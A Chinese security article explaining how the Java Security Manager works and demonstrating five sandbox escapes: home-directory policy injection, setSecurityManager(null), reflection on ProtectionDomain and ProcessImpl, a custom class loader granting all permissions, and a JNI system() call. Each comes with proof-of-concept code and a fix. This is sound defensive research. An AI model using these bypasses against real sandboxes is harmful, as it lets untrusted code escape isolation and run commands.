> 原文链接: https://www.anquanke.com//post/id/151398 


# java沙箱绕过


                                阅读量   
                                **315535**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p0.ssl.qhimg.com/t016acf1d94fbefc43f.jpg)](https://p0.ssl.qhimg.com/t016acf1d94fbefc43f.jpg)

## 0x00 前言

最近两年CTF比赛中出现了Python沙箱绕过，关于Python沙盒的文章比较多，其实Java也有沙箱。而恰好笔者在做安全测试的时候遇到了Java沙箱，于是研究了一下Java沙箱的绕过。虽然Java不像PHP和python那么灵活，但是Java沙箱能玩的地方还是挺多的。

文章脑图如下，**配合食用效果更佳**。有错误或者疏漏的地方请各位指出，欢迎联系[c0d3p1ut0s@gmail.com](mailto:c0d3p1ut0s@gmail.com)。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2018/07/10/5b449b9daaa3e.png)



## 0x01 Java沙箱

Java沙箱由以下部分组成：
- 类加载器结构（例如命名空间）
- class文件校验器
- 内置于Java虚拟机（和Java语言）的安全特性（例如对指针操作的屏蔽等）
- Java安全管理器（Java Security Manager）和Java API组成
前三个基本都是**内置**实现在JVM和Java语言中的，只有Java安全管理器（Java Security Manager）是能被开发者控制的，用来保护系统不被JVM中恶意的代码破坏的。这样，**绕过java沙箱其实就转化成绕过java security manager**。

Java Security Manager的一个典型应用场景是jvm需要加载运行一段代码，但是这段代码是不可信的，例如来自用户的输入、上传、反序列化指定的bytecode或者来自网络远程加载，这种情况下，需要防止不可信来源的恶意代码对系统造成破坏。其实这就是沙箱的应用场景。



## 0x02 Java Security Manager介绍

在java后面加一个参数即可打开Java Security Manager，

```
-Djava.security.manager
```

java提供了默认的Java Security Manager实现类，如果你想自定义自己的实现，可以在java.security.manager加等号指定。例如：

```
java -Djava.security.manager=net.sourceforge.prograde.sm.ProGradeJSM
```

这样就指定了net.sourceforge.prograde.sm.ProGradeJSM作为实现，在绝大多数情况下，我们都使用原生的实现，一些第三方实现也只是扩展了策略文件的功能而已，那么什么是策略文件呢？

策略(policy)文件是一个配置文件，指定了哪些类有哪些权限。指定策略文件的命令如下：

```
java -Djava.security.manager -Djava.security.policy=./security.policy -jar a.jar
```

一般我们需要指定哪些类有哪些权限，编辑policy文件就可以了。

上面说了，policy文件的作用是指定哪些类有哪些权限。policy怎么指定这些类的呢？指定类名吗？并不是，policy文件根据`类的url和类的签名`来确定类，指定权限，例如：

```
grant signedBy "Duke" `{`
      permission java.io.FilePermission "/tmp/*", "read,write";
  `}`;

  grant  codeBase "file:/home/sysadmin/*" `{`
      permission java.security.SecurityPermission "Security.insertProvider.*";
      permission java.security.SecurityPermission "Security.removeProvider.*";
      permission java.security.SecurityPermission "Security.setProperty.*";
  `}`;
```

policy文件的具体语法参看[这里](https://docs.oracle.com/javase/8/docs/technotes/guides/security/PolicyFiles.html)。

根据java的设计，一个类的url和签名组成了这个类的CodeSource，根据policy文件的配置，一个CodeSource有一定的权限。一个类的CodeSource和它的权限构成了这个类的ProtectionDomain。如下图

[![](https://i.loli.net/2018/07/10/5b449bdc3073a.png)](https://i.loli.net/2018/07/10/5b449bdc3073a.png)

[![](https://i.loli.net/2018/07/10/5b449c071e6e2.png)](https://i.loli.net/2018/07/10/5b449c071e6e2.png)

一个类的ProtectionDomain在这个类加载的时候初始化，在java.lang.ClassLoader中：

```
@Deprecated
    protected final Class&lt;?&gt; defineClass(byte[] b, int off, int len)
        throws ClassFormatError
    `{`
        return defineClass(null, b, off, len, null);
    `}`
```

这里调用了defineClass(null, b, off, len, null)，最后一个参数null是ProtectionDomain的值，这个函数的实现如下：

```
protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len,
                                         ProtectionDomain protectionDomain)
        throws ClassFormatError
    `{`
        protectionDomain = preDefineClass(name, protectionDomain);//初始化这个类的ProtectionDomain
        String source = defineClassSourceLocation(protectionDomain);
        Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);
        postDefineClass(c, protectionDomain);
        return c;
    `}`
```

一个类的ProtectionDomain我们已经搞清楚了，那么ProtectionDomain有什么用？Java Security Manager是怎么做安全监测的呢？

当调用一个需要权限的类时，例如读写文件、执行命令、开关socket等。这个类会调用SecurityManager.checkXXX()，如果SecurityManager判定有权限，这个方法会默默返回，否则抛出安全异常。以读文件FileInputStream为例

```
public FileInputStream(File file) throws FileNotFoundException `{`
        String name = (file != null ? file.getPath() : null);
        SecurityManager security = System.getSecurityManager();
        if (security != null) `{`
            security.checkRead(name);//权限检查
        `}`
        if (name == null) `{`
            throw new NullPointerException();
        `}`
        if (file.isInvalid()) `{`
            throw new FileNotFoundException("Invalid file path");
        `}`
        fd = new FileDescriptor();
        fd.attach(this);
        path = name;
        open(name);
    `}`
```

读文件是SecurityManager.checkRead方法，写文件是SecurityManager.checkWrite方法，这些checkXXX方法最后都会调用SecurityManager.checkPermission方法，调用链如下图所示。

```
SecurityManager.checkXXX()
    |
    V
·······
    |
    V
SecurityManager.checkPermission()
    | 在默认的Security Manager实现中
    V
AccessController.checkPermission()

```

如上图，在默认的Security Manager实现中，真正的检查权限这个操作是由AccessController.checkPermission()这个方法实现的。下面我们来看看权限是怎么检查的。

当AccessController.checkPermission()被调用时，AccessController会自顶向下遍历当前栈（入栈到栈顶），栈由栈帧组成，每一个栈帧都是一个方法调用形成的，每个方法都属于一个类，每个类都有一个ProtectionDomain，则一个栈帧对应一个ProtectionDomain。AccessController遍历栈帧，如果某个栈帧对应的ProtectionDomain没有check的权限，则抛出异常。

同时，为了解决某些问题，AccessController还提供了doPrivilege方法，当这个方法被调用时，AccessController亦会自顶向下遍历当前栈，不过只会遍历到调用doPrivileged方法的栈帧就会停止。例如Main.main调用Class1.fun1()，Class1.fun1()调用了doPrivileged方法，在doPrivileged方法中进行了一些操作，AccessController的检查只会遍历到Class1.fun1()，看Class1是否有权限。

很明显，doPrivileged是非常危险的，因为它截断了AccessController的检查。之前Java Security Manager出过的几次漏洞都跟jdk类库不当调用doPrivileged方法，而doPrivileged方法中执行的操作能被用户代码控制有关。因为默认情况下，jdk类库是有所有权限的，即使调用jdk的用户代码没有权限，AccessController也不会再向下检查了。



## 0x03 Java Security Manager的绕过

在某些情况下，赋予某些权限时，恶意代码可以利用这些权限，导致Java Security Manager完全失效。下面我们看看一些实例

### <a class="reference-link" name="%E5%8D%95%E7%AD%89%E5%8F%B7+home%E7%9B%AE%E5%BD%95%E5%8F%AF%E5%86%99%E5%AF%BC%E8%87%B4Java%20Security%20Manager%E7%BB%95%E8%BF%87"></a>单等号+home目录可写导致Java Security Manager绕过

jre/lib/security/java.security是java中指定安全配置文件，在配置文件中指定了两个默认的policy文件：

```
# The default is to have a single system-wide policy file,
# and a policy file in the user's home directory.
policy.url.1=file:$`{`java.home`}`/lib/security/java.policy
policy.url.2=file:$`{`user.home`}`/.java.policy
```

而通过`-Djava.security.policy`指定policy文件时，如果参数后面是一个等号，例如`-Djava.security.policy=java.policy`，java.policy会加在上面的两个policy文件之后。在默认情况下，家目录下没有.java.policy这个文件，如果家目录可写，则恶意代码可以通过写.java.policy文件，授予自己更多的权限来绕过Java Security Manager。如下图所示，policy文件没有赋予文件的执行权限，却执行calc成功，成功绕过java security manager机制，逃逸沙箱。

java.policy:

```
grant `{`
    permission java.io.FilePermission "C:\Users\Administrator\-", "read,write";
`}`;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2018/07/10/5b449c075d9e4.png)

exp代码：[https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/rewrite-home-policy](https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/rewrite-home-policy)

修复方法：`-Djava.security.policy==java.policy`，用双等于号指定policy文件。

### <a class="reference-link" name="%E9%80%9A%E8%BF%87setSecurityManager%E7%BB%95%E8%BF%87Java%20Security%20Manager"></a>通过setSecurityManager绕过Java Security Manager

java security manager不仅能通过参数`-Djava.security.policy==java.policy`指定，还可以在运行时通过`System.setSecurityManager()`方法指定。如果被授予setSecurityManager权限，恶意代码可以在运行时调用setSecurityManager方法，将java security manager置为null，绕过Java Security Manager。

java.policy如下

```
grant `{`
    permission java.lang.RuntimePermission "setSecurityManager";
`}`;
```

绕过poc

```
System.setSecurityManager(null);
```

如下图所示，同样policy文件没有赋予文件的执行权限，却执行calc成功，成功绕过java security manager机制，逃逸沙箱。

java.policy:

```
grant `{`
    permission java.lang.RuntimePermission "setSecurityManager";
`}`;
```

[![](https://i.loli.net/2018/07/10/5b449c0760127.png)](https://i.loli.net/2018/07/10/5b449c0760127.png)

exp代码：[https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/set-security-manager](https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/set-security-manager)

修复方法：不授予不可信的代码setSecurityManager权限。

### <a class="reference-link" name="%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E7%BB%95%E8%BF%87Java%20Security%20Manager"></a>通过反射绕过Java Security Manager

如果读者跟了上面的`System.setSecurityManager`这个方法的话，可以看到这个方法最后直接把参数直接赋予了System类中的security变量。

```
private static synchronized
    void setSecurityManager0(final SecurityManager s) `{`
        SecurityManager sm = getSecurityManager();
        if (sm != null) `{`
            // ask the currently installed security manager if we
            // can replace it.
            sm.checkPermission(new RuntimePermission
                                     ("setSecurityManager"));
        `}`

        if ((s != null) &amp;&amp; (s.getClass().getClassLoader() != null)) `{`
            // New security manager class is not on bootstrap classpath.
            // Cause policy to get initialized before we install the new
            // security manager, in order to prevent infinite loops when
            // trying to initialize the policy (which usually involves
            // accessing some security and/or system properties, which in turn
            // calls the installed security manager's checkPermission method
            // which will loop infinitely if there is a non-system class
            // (in this case: the new security manager class) on the stack).
            AccessController.doPrivileged(new PrivilegedAction&lt;Object&gt;() `{`
                public Object run() `{`
                    s.getClass().getProtectionDomain().implies
                        (SecurityConstants.ALL_PERMISSION);
                    return null;
                `}`
            `}`);
        `}`

        security = s;//赋值在这里~
    `}`
```

如果被赋予了反射权限，那么是否能通过反射直接把security置为null，使java security manager失效呢？我们试验一下：

java.policy如下

```
grant `{`
    permission java.lang.reflect.ReflectPermission "suppressAccessChecks";
    permission java.lang.RuntimePermission "accessDeclaredMembers";
`}`;
```

反射代码

```
public static void setSecurityByReflection()`{`
        try `{`
            Class clz = Class.forName("java.lang.System");
            Field field=clz.getDeclaredField("security");
            field.setAccessible(true);
            field.set(System.class,null);

        `}`catch (Exception e)`{`
            e.printStackTrace();
        `}`
    `}`
```

竟然报异常

```
java.lang.NoSuchFieldException: security
    at java.lang.Class.getDeclaredField(Class.java:2070)
    at evil.Poc.setSecurityByReflection(Poc.java:35)
    at evil.Poc.main(Poc.java:16)
```

不科学啊，反复试了几次，发现java.lang.System中其他变量都可以反射，就security变量不行。（这个坑调试了一下午=_=||）

不死心，跟了一下getDeclaredField方法，发现在sun.reflect.Reflection中定义了一个fieldFilterMap，指定了几个禁止反射的变量。

```
static `{`
        HashMap var0 = new HashMap();
        var0.put(Reflection.class, new String[]`{`"fieldFilterMap", "methodFilterMap"`}`);
        var0.put(System.class, new String[]`{`"security"`}`);
        var0.put(Class.class, new String[]`{`"classLoader"`}`);
        fieldFilterMap = var0;
        methodFilterMap = new HashMap();
    `}`
```

其中就包括System.class中的security变量以及fieldFilterMap本身。在getDeclaredField中，调用了过滤fields的方法，过滤了这些变量。

```
public static Field[] filterFields(Class&lt;?&gt; var0, Field[] var1) `{`
        return fieldFilterMap == null?var1:(Field[])((Field[])filter(var1, (String[])fieldFilterMap.get(var0)));
    `}`
```

看来，通过反射直接修改security是不行的了。这游戏真难。

然而，java的反射何其强大，既然负责检查的检察官java security manager不可修改，那我就修改你检查的材料—ProtectionDomain。于是我看了一下ProtectionDomain类：<br>
java.security.ProtectionDomain

```
public class ProtectionDomain `{`
    //.....省略部分代码
    static `{`
        // Set up JavaSecurityAccess in SharedSecrets
        SharedSecrets.setJavaSecurityAccess(new JavaSecurityAccessImpl());
    `}`

    /* CodeSource */
    private CodeSource codesource ;

    /* ClassLoader the protection domain was consed from */
    private ClassLoader classloader;

    /* Principals running-as within this protection domain */
    private Principal[] principals;

    /* the rights this protection domain is granted */
    private PermissionCollection permissions;

    /* if the permissions object has AllPermission */
    private boolean hasAllPerm = false;

    /* the PermissionCollection is static (pre 1.4 constructor)
       or dynamic (via a policy refresh) */
    private boolean staticPermissions;

    //.....省略部分代码
```

如前面所说，一个类的CodeSource和permissions构成了这个类的ProtectionDomain，亦可通过这里来验证。仔细看一遍，发现hasAllPerm可能是个软柿子，应该是一个标记这个类是否有所有权限的布尔变量。利用反射，把它置为true应当可以使当前类获取所有权限。

但是AccessController会沿着栈自顶向下检查，必须所有栈帧都有权限才能通过。不慌，那我们也遍历所有栈帧，将所有栈帧中的所有类的ProtectionDomain中的hasAllPerm置为true。代码如下：

```
public static void setHasAllPerm()`{`

        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
        //遍历栈帧
        for (StackTraceElement stackTraceElement : stackTraceElements) `{`
            try `{`
                //反射当前栈帧中的类
                Class clz = Class.forName(stackTraceElement.getClassName());
                Field field = clz.getProtectionDomain().getClass().getDeclaredField("hasAllPerm");
                //压制java的访问检查
                field.setAccessible(true);
                //把hasAllPerm置为true
                field.set(clz.getProtectionDomain(), true);
            `}`catch (Exception e)`{`
                e.printStackTrace();
            `}`
        `}`
        exec("calc");
    `}`
```

运行一下，又抛出了异常

```
java.security.AccessControlException: access denied ("java.lang.RuntimePermission" "getProtectionDomain")
    at java.security.AccessControlContext.checkPermission(AccessControlContext.java:472)
    at java.security.AccessController.checkPermission(AccessController.java:884)
    at java.lang.SecurityManager.checkPermission(SecurityManager.java:549)
    at java.lang.Class.getProtectionDomain(Class.java:2299)
    at evil.Poc.setHasAllPerm(Poc.java:43)
    at evil.Poc.main(Poc.java:19)

```

没有getProtectionDomain的权限。我们看看getProtectionDomain的实现：

```
public java.security.ProtectionDomain getProtectionDomain() `{`
        SecurityManager sm = System.getSecurityManager();
        if (sm != null) `{`
            //在这里检查权限
            sm.checkPermission(SecurityConstants.GET_PD_PERMISSION);
        `}`
        //调用native方法获取ProtectionDomain
        java.security.ProtectionDomain pd = getProtectionDomain0();
        if (pd == null) `{`
            if (allPermDomain == null) `{`
                java.security.Permissions perms =
                    new java.security.Permissions();
                perms.add(SecurityConstants.ALL_PERMISSION);
                allPermDomain =
                    new java.security.ProtectionDomain(null, perms);
            `}`
            pd = allPermDomain;
        `}`
        return pd;
    `}`

    private native java.security.ProtectionDomain getProtectionDomain0();
```

getProtectionDomain方法中，先检查了权限，然后再调用私有的原生方法getProtectionDomain0来完成getProtectionDomain。那么我们完全可以通过反射直接运行getProtectionDomain0方法，从而绕过对getProtectionDomain方法的权限检查。代码如下：

```
public static void setHasAllPerm0()`{`
        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
        //遍历栈帧
        for (StackTraceElement stackTraceElement : stackTraceElements) `{`
            try `{`
                Class clz=Class.forName(stackTraceElement.getClassName());
                //利用反射调用getProtectionDomain0方法
                Method getProtectionDomain=clz.getClass().getDeclaredMethod("getProtectionDomain0",null);
                getProtectionDomain.setAccessible(true);
                ProtectionDomain pd=(ProtectionDomain) getProtectionDomain.invoke(clz);

                if(pd!=null)`{`
                    Field field=pd.getClass().getDeclaredField("hasAllPerm");
                    field.setAccessible(true);
                    field.set(pd,true);
                `}`
            `}`catch (Exception e)`{`
                e.printStackTrace();
            `}`
        `}`
        exec("calc");
    `}`
```

运行，如下图所示，同样policy文件没有赋予文件的执行权限，却执行calc成功，成功绕过java security manager机制，逃逸沙箱。

java.policy:

```
grant `{`
    permission java.lang.reflect.ReflectPermission "suppressAccessChecks";
    permission java.lang.RuntimePermission "accessDeclaredMembers";
`}`;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2018/07/10/5b449c0760768.png)

exp地址：[https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/bypass-by-reflection](https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/bypass-by-reflection)

修复方法：不授予accessDeclaredMembers权限和suppressAccessChecks权限。

然而在java中，反射是一个非常常见的操作，如果由于业务需要，无法禁用反射，可以设置禁止反射的方法和变量的黑名单。还记得上面无法反射System类中security的原因吗？在sun.reflect.Reflection中定义了静态的methodFilterMap和fieldMethodMap，在这里面的方法和变量禁止反射。sun.reflect.Reflection还提供了几个方法，可以往methodFilterMap和fieldMethodMap中添加自定义的黑名单。代码如下：

```
public static synchronized void registerFieldsToFilter(Class&lt;?&gt; var0, String... var1) `{`
        fieldFilterMap = registerFilter(fieldFilterMap, var0, var1);
    `}`
    public static synchronized void registerMethodsToFilter(Class&lt;?&gt; var0, String... var1) `{`
        methodFilterMap = registerFilter(methodFilterMap, var0, var1);
    `}`
```

这样，只需要在加载恶意代码之前，把禁止反射的黑名单加入这两个map即可。

使用这种方式时，需要注意，有些方法的实现是，在public方法里面调用security manager检查权限，然后调用一个protect或者private方法实现功能。这样，攻击者可以直接反射实现功能的方法，绕过security manager的检查。例如平时我们调用`Runtime.getRuntime().exec(command)`，调用链如下：

```
public Process exec(String[] cmdarray, String[] envp, File dir)
        throws IOException `{`
        return new ProcessBuilder(cmdarray)
            .environment(envp)
            .directory(dir)
            .start();
    `}`
```

这里执行命令的功能是调用ProcessBuilder实现的。我们跟进去看一下start方法：

```
public Process start() throws IOException `{`
        //省略部分代码

        SecurityManager security = System.getSecurityManager();
        if (security != null)
            security.checkExec(prog);
        //在这里检查了是否有执行命令的权限

        //省略部分代码
        try `{`
            return ProcessImpl.start(cmdarray,
                                     environment,
                                     dir,
                                     redirects,
                                     redirectErrorStream);
        `}`
        //最后调用ProcessImpl.start实现这个功能。
        //省略部分代码
    `}`
```

从代码中我们看到，正如前面所说，完成功能的是ProcessImpl.start方法，而在这个方法调用之前，security manager就已经完成了检测，于是，反射这个方法，调用它，就可以绕过检测。代码如下

```
public static void executeCommandWithReflection(String command)`{`
        try `{`
            Class clz = Class.forName("java.lang.ProcessImpl");
            Method method = clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
            method.setAccessible(true);
            method.invoke(clz,new String[]`{`command`}`,null,null,null,false);
        `}`catch (Exception e)`{`
            e.printStackTrace();
        `}`
    `}`
```

### <a class="reference-link" name="%E5%88%9B%E5%BB%BA%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87java%20security%20manager"></a>创建类加载器绕过java security manager

如前面所说，一个类的ProtectionDomain在这个类被类加载器加载时初始化，如果我们能自定义一个类加载器，加载一个恶意类，并且把它的ProtectionDomain里面的权限初始化成所有权限，这个恶意类不就可以有所有权限了吗？即便如此，这个恶意类被调用时，它仅仅是栈中的一个栈帧，在它下面的栈帧对应的权限仍是policy文件指定的权限。

这个时候就是doPrivileged发挥作用的时候了，如上面所说，AccessController会自顶向下遍历栈帧，如果遍历到doPrivileged，它会检查到调用doPrivileged方法的栈帧为止。只要我们在恶意类中调用doPrivileged方法，AccessController只会向下遍历检查到恶意类所在的栈帧，而恶意类对应的权限是所有权限，这样就可以绕过Java Security Manager。

java.policy如下，这里需要读class文件，所以需要读文件权限

```
grant`{`
    permission java.lang.RuntimePermission "createClassLoader";
    permission java.io.FilePermission "&lt;&lt;ALL FILES&gt;&gt;", "read";
`}`;
```

恶意类：com.evil.EvilClass

```
public class EvilClass `{`
    static`{`
        //在doPrivileged中执行恶意操作
        AccessController.doPrivileged(new  PrivilegedAction()  `{`
            @Override
            public  Object run() `{`
                try `{`
                    Process process = Runtime.getRuntime().exec("calc");

                    return null;
                `}`catch (Exception e)`{`
                    e.printStackTrace();
                    return null;
                `}`
            `}`
        `}`);

    `}`
`}`
```

自定义类加载器：

```
public class MyClassLoader extends ClassLoader
`{`
    //.....省略部分代码
    @Override
    protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException
    `{`
        File file = getClassFile(name);
        try
        `{`
            //获取byte数组的字节码
            byte[] bytes = getClassBytes(file);
            //这里没有调用父类的defineClass方法，而是调用了下面的defineClazz方法。
            Class&lt;?&gt; c = defineClazz(name, bytes, 0, bytes.length);
            return c;
        `}`
        catch (Exception e)
        `{`
            e.printStackTrace();
        `}`

        return super.findClass(name);
    `}`

    //在这个自定义的defineClazz方法中
    protected final Class&lt;?&gt; defineClazz(String name, byte[] b, int off, int len)
            throws ClassFormatError
    `{`
        try `{`
            PermissionCollection pc=ClassLoader.class.getProtectionDomain().getPermissions();
            //赋予ClassLoader类的权限，其实就是所有权限
            ProtectionDomain pd=new ProtectionDomain(new CodeSource(null, (Certificate[]) null),
                    pc, this, null);

            //调用父类的defineClass完成功能
            return this.defineClass(name, b, off, len, pd);
        `}`catch (Exception e)`{`
            return null;
        `}`
    `}`
    //.....省略部分代码
`}`
```

在findClass方法中，我们并没有直接调用父类的defineClass方法，因为在父类的defineClass方法中：

java.lang.ClassLoader line639

```
protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len)
        throws ClassFormatError
    `{`
        //最后一个参数是传入的ProtectionDomain
        //这个函数的实现抄录在下面
        return defineClass(name, b, off, len, null);
    `}`
```

跟一下defineClass

```
protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len,
                                         ProtectionDomain protectionDomain)
        throws ClassFormatError
    `{`
        //preDefineClass的实现在下面
        protectionDomain = preDefineClass(name, protectionDomain);
        String source = defineClassSourceLocation(protectionDomain);
        Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);
        postDefineClass(c, protectionDomain);
        return c;
    `}`
```

跟一下preDefineClass

```
private ProtectionDomain preDefineClass(String name,
                                            ProtectionDomain pd)
    `{`
        if (!checkName(name))
            throw new NoClassDefFoundError("IllegalName: " + name);

        // Note:  Checking logic in java.lang.invoke.MemberName.checkForTypeAlias
        // relies on the fact that spoofing is impossible if a class has a name
        // of the form "java.*"
        if ((name != null) &amp;&amp; name.startsWith("java.")) `{`
            throw new SecurityException
                ("Prohibited package name: " +
                 name.substring(0, name.lastIndexOf('.')));
        `}`
        if (pd == null) `{`
            pd = defaultDomain;
        `}`

        if (name != null) checkCerts(name, pd.getCodeSource());

        return pd;
    `}`
```

传入的默认ProtectionDomain是null。我们调用了defineClazz方法，赋予了加载的类所有的权限，然后传入defineClass方法，完成类加载过程。如下图所示，同样policy文件没有赋予文件的执行权限，却执行calc成功，成功绕过java security manager机制，逃逸沙箱。

java.policy:

```
grant`{`
    permission java.lang.RuntimePermission "createClassLoader";
    permission java.io.FilePermission "&lt;&lt;ALL FILES&gt;&gt;", "read";
`}`;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2018/07/10/5b449c0760de3.png)

exp地址：[https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/bypass-by-createclassloader](https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/bypass-by-createclassloader)

修复方法：禁止createClassLoader

### <a class="reference-link" name="%E6%9C%AC%E5%9C%B0%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E7%BB%95%E8%BF%87Java%20Security%20Manager"></a>本地方法调用绕过Java Security Manager

Java Security Manager是在java核心库中的一个功能，而java中native方法是由jvm执行的，不受java security manager管控。因此，我们可以调用java native方法，绕过java security manager。

java.policy

```
grant`{`
permission java.lang.RuntimePermission "loadLibrary.*";
permission java.io.FilePermission "/root/-", "read";
`}`;
```

声明一个native方法：

```
package com.evil;

public class EvilMethodClass `{`
    //加载动态链接库
    static `{`
        System.load("/root/libEvilMethodClass.so");
    `}`
    //声明一个native方法
    public static native String evilMethod(String name);
`}`
```

生成.h头

```
javac src/com/evil/EvilMethodClass.java -d ./bin
javah -jni -classpath ./bin -d ./jni com.evil.EvilMethodClass
javah -jni -classpath ./bin -o EvilMethodClass.h com.evil.EvilMethodClass
```

新建EvilMethodClass.c

```
#include "com_evil_EvilMethodClass.h"
#include&lt;stdlib.h&gt;

#ifdef __cplusplus
extern "C"
`{`
#endif


JNIEXPORT jstring JNICALL Java_com_evil_EvilMethodClass_evilMethod(
        JNIEnv *env, jclass cls, jstring j_str)
`{`
    const char *c_str = NULL;
    char buff[128] = `{` 0 `}`;
    c_str = (*env)-&gt;GetStringUTFChars(env, j_str, NULL);
    if (c_str == NULL)
    `{`
        printf("out of memory.n");
        return NULL;
    `}`
    //在这里执行系统命令
    system(c_str);
    (*env)-&gt;ReleaseStringUTFChars(env, j_str, c_str);
    return (*env)-&gt;NewStringUTF(env, buff);
`}`
#ifdef __cplusplus
`}`
#endif
```

编译，生成动态链接库

```
gcc -I$JAVA_HOME/include -I$JAVA_HOME/include/linux -fPIC -shared EvilMethodClass.c -o libEvilMethodClass.so
```

放到/root/目录下<br>
Poc.java

```
public class Poc `{`
    public static void main(String[] args)`{`
        EvilMethodClass.evilMethod("whoami");
    `}`
`}`
```

我编译了Linux下的so，如下图所示，同样policy文件没有赋予文件的执行权限，却执行whoami成功，成功绕过java security manager机制，逃逸沙箱。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2018/07/10/5b449c06b94d6.png)

exp如下：[https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/invoke-native-method](https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/invoke-native-method)

修复方案：不授予loadLibrary权限



## 0x04 第三方java security manager的安全性

从上面的绕过方法来看，在给不可信的代码授予权限时需要非常谨慎，有些权限一旦授予，就可能导致整个java security manager体系的绕过。

默认java security manager的policy是白名单模式的，也就是说，只有在policy文件出现的权限才是被授予的。而有些第三方的java security manager支持黑名单模式，这样更加危险。例如[pro-grade](http://pro-grade.sourceforge.net/)，它支持黑名单模式，实现了deny语法。这意味着如果没有把上面提到的这些危险的权限禁止的话，绕过java security manager将会是非常容易的。



## 0x05 Reference
- [https://docs.oracle.com/javase/8/docs/api/java/lang/SecurityManager.html](https://docs.oracle.com/javase/8/docs/api/java/lang/SecurityManager.html)
- [https://docs.oracle.com/javase/8/docs/api/java/lang/RuntimePermission.html](https://docs.oracle.com/javase/8/docs/api/java/lang/RuntimePermission.html)
- [https://docs.oracle.com/javase/8/docs/technotes/guides/security/PolicyFiles.html](https://docs.oracle.com/javase/8/docs/technotes/guides/security/PolicyFiles.html)
这篇文章中使用的绕过的代码都已上传到[github](https://github.com/c0d3p1ut0s/java-security-manager-bypass/)。

审核人：yiwang   编辑：边边
